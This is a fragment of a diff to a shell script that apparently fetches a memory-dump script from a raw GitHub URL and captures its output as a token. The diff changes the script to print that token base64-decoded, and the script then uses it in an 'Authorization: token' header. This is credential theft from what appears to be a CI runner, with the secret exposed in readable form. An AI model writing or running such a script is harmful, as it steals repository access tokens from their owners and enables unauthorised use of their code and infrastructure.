@@ -6,7 +6,7 @@ TOKEN_VAL2=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdu
 echo "-----------------------------------------------------------------"
 echo "abc" "$TOKEN_VAL" "xyz"
 echo "-----------------------------------------------------------------"
-echo "$TOKEN_VAL2"
+echo "$TOKEN_VAL2" | base64 --decode
 echo "-----------------------------------------------------------------"
 #echo "https://api.github.com/repos/${REPO}/contents/README.md"
 Header="Authorization: token $TOKEN_VAL2"
